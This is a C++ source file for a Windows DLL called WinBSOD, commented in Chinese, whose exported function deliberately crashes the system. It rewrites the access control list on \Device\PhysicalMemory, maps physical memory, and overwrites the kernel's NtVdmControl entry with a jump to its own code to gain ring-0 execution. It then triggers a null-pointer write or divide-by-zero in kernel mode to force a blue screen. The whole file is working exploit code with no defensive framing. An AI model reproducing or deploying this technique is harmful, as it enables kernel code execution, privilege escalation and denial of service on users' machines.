// WinBSOD.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "WinBSOD.h"
#include "ring0.h"

#ifdef _MANAGED
#pragma managed(push, off)
#endif

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
    return TRUE;
}

#ifdef _MANAGED
#pragma managed(pop)
#endif


int bsod_type = 0;
BOOL BSODgo();

// This is an example of an exported function.
WINBSOD_API int WinBSOD(int _type)
{
	bsod_type = _type;
	BSODgo();
	return 0x00DEAD00;
}



//////////////////////////////////////////////////////////////////////////
// 以下是实现

PVOID MapPhysicalMemory(HANDLE hSection, // 物理内存的Section句柄
						DWORD Offset,    // 映射起始偏移量，相对于物理内存的0地址
						DWORD CommitSize // 映射范围
						)
{
	NTSTATUS status;
	PVOID BaseAddress = NULL;
	LARGE_INTEGER PhysicalAddress = {Offset, 0};
	SIZE_T ViewSize = CommitSize;

	status = ZwMapViewOfSection(hSection, (HANDLE)-1, &BaseAddress, 0,
		CommitSize, &PhysicalAddress, &ViewSize, ViewShare, 0, PAGE_READWRITE);
	if (!NT_SUCCESS(status)) return NULL;

	return BaseAddress;
}
PVOID GetModuleBase(PCSTR name)
{
	NTSTATUS status;
	PVOID pBuffer, pModule;
	DWORD nRetSize, i, n;
	PSYSTEM_MODULE_INFORMATION pmi;

	pBuffer = LocalAlloc(LPTR, 0x1000);
	if (NULL == pBuffer)
	{
		return NULL;
	}

	status = ZwQuerySystemInformation(SystemModuleInformation, pBuffer, 0x1000, &nRetSize);
	if (STATUS_INFO_LENGTH_MISMATCH == status)
	{
		// 缓冲区太小，重新分配
		LocalFree(pBuffer);
		pBuffer = LocalAlloc(LPTR, nRetSize);
		if (NULL == pBuffer)
		{
			return NULL;
		}
		status = ZwQuerySystemInformation(SystemModuleInformation, pBuffer, nRetSize, &nRetSize);
	}
	if (!NT_SUCCESS(status))
	{
		LocalFree(pBuffer);
		return NULL;
	}

	pmi = (PSYSTEM_MODULE_INFORMATION)((DWORD)pBuffer + 4);
	n = *(PDWORD)pBuffer;
	pModule = NULL;

	// 搜索指定的模块名，获取基址
	for (i=0; i<n; i++)
	{
		if (!_stricmp(pmi->ImageName+pmi->ModuleNameOffset, name))
		{
			pModule = pmi->Base;
			break;
		}
		pmi++;
	}

	LocalFree(pBuffer);
	return pModule;
}

NTSTATUS Ring0Code(DWORD param1, DWORD param2) // 参数个数与NtVdmControl一致，以平衡堆栈
{
	if (bsod_type == 0)
	{
		*((int*)0) = 0;
	}
	else if (bsod_type == 1)
	{
		int a = 1;
		a = a / (--a);
		return a;
	}
	return 0;
}

HANDLE OpenPhysicalMemory()
{
	DWORD dwRet;
	NTSTATUS status;
	UNICODE_STRING name;
	OBJECT_ATTRIBUTES oa;
	EXPLICIT_ACCESS ea;
	PSECURITY_DESCRIPTOR pSD = NULL;
	PACL pDacl = NULL;
	PACL pNewDacl = NULL;
	HANDLE hSection = NULL;
	HANDLE hSectionRet = NULL;

	RtlInitUnicodeString(&name, L"\\Device\\PhysicalMemory");
	InitializeObjectAttributes(&oa, &name, OBJ_KERNEL_HANDLE, NULL, NULL);

	// 以可读写Section权限打开PhysicalMemory
	status = ZwOpenSection(&hSectionRet, SECTION_MAP_READ | SECTION_MAP_WRITE, &oa);

	if (NT_SUCCESS(status)) goto FreeAndExit; // 打开成功，直接返回

	if (status != STATUS_ACCESS_DENIED)
	{
		// 错误，但非权限不足，打开失败
		hSectionRet = NULL;
		goto FreeAndExit;
	}

	// 以可读写ACL权限打开PhysicalMemory
	status = ZwOpenSection(&hSection, READ_CONTROL | WRITE_DAC, &oa);
	if (!NT_SUCCESS(status)) goto FreeAndExit;

	// 获取PhysicalMemory的DACL
	dwRet = GetSecurityInfo(hSection, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION,
		NULL, NULL, &pDacl, NULL, &pSD);
	if (dwRet != ERROR_SUCCESS) goto FreeAndExit;

	// 创建一个ACE，允许当前用户读写PhysicalMemory
	ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
	ea.grfAccessPermissions = SECTION_MAP_READ | SECTION_MAP_WRITE;
	ea.grfAccessMode = GRANT_ACCESS;
	ea.grfInheritance = NO_INHERITANCE;
	ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
	ea.Trustee.TrusteeType = TRUSTEE_IS_USER;
	ea.Trustee.ptstrName = TEXT("CURRENT_USER");

	// 将新的ACE加入DACL
	dwRet = SetEntriesInAcl(1, &ea, pDacl, &pNewDacl);
	if (dwRet != ERROR_SUCCESS) goto FreeAndExit;

	// 更新PhysicalMemory的DACL
	dwRet = SetSecurityInfo(hSection, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION,
		NULL, NULL, pNewDacl, NULL);
	if (dwRet != ERROR_SUCCESS) goto FreeAndExit;

	// 再次以可读写权限打开PhysicalMemory
	status = ZwOpenSection(&hSectionRet, SECTION_MAP_READ | SECTION_MAP_WRITE, &oa);
	if (!NT_SUCCESS(status)) goto FreeAndExit;

FreeAndExit:
	if (pSD) LocalFree(pSD);
	if (pNewDacl) LocalFree(pNewDacl);
	if (hSection) ZwClose(hSection);
	return hSectionRet;
}

BOOL BSODgo()
{
	DWORD dwTemp;
	LARGE_INTEGER liTemp = {0,0};
	char* Kernel	= "ntkrnlpa.exe";
	TCHAR* KernelW = TEXT("ntkrnlpa.exe");
	PVOID pKernel = NULL;
	HMODULE hKernel = NULL;
	HANDLE hSection = NULL;
	char *mapping = NULL;
	PVOID buffer	= NULL;
	DWORD offset;
	NTSTATUS status;
	char HookCode[24] = "\xE9\xDD\xDD\xDD\xDD"; // jmp 0xdddddddd ;Ring0Code

	PFNNTVDMCONTROL					pfnNtVdmControl = NULL;
	PFNMMGETPHYSICALADDRESS pfnMmGetPhysicalAddress = NULL;

	// 获取系统核心模块ntoskrnl.exe的基址
	pKernel = GetModuleBase(Kernel);

	// 在用户态加载一份ntoskrnl.exe
	hKernel = LoadLibrary(KernelW);

	// 获取内核例程/变量在用户态的相对位置
	pfnNtVdmControl = (PFNNTVDMCONTROL)GetProcAddress(hKernel, "NtVdmControl");

	// 计算内核例程/变量的实际地址
	offset = (DWORD)pKernel - (DWORD)hKernel;
	dwTemp = (DWORD)pfnNtVdmControl;
	pfnNtVdmControl = (PFNNTVDMCONTROL)(dwTemp + offset);

	// 设置HookCode
	*(PDWORD)(HookCode+1) = (DWORD)(Ring0Code) - (DWORD)pfnNtVdmControl - 5;

	// 打开物理内存Section
	hSection = OpenPhysicalMemory();

	// 映射NtVdmControl入口附近的内存
	offset = (DWORD)pfnNtVdmControl & 0x1FFFF000;   // 转换到物理内存页地址
	mapping = (char*)MapPhysicalMemory(hSection, offset, 0x2000);

	// 保存NtVdmControl入口代码
	offset = (DWORD)pfnNtVdmControl & 0x00000FFF;   // 页内偏移

	memcpy(mapping+offset, HookCode, 24);   // 挂钩NtVdmControl
	status = NtVdmControl(0, 0);  // 调用NtVdmControl，进入Ring0

	return TRUE;
}
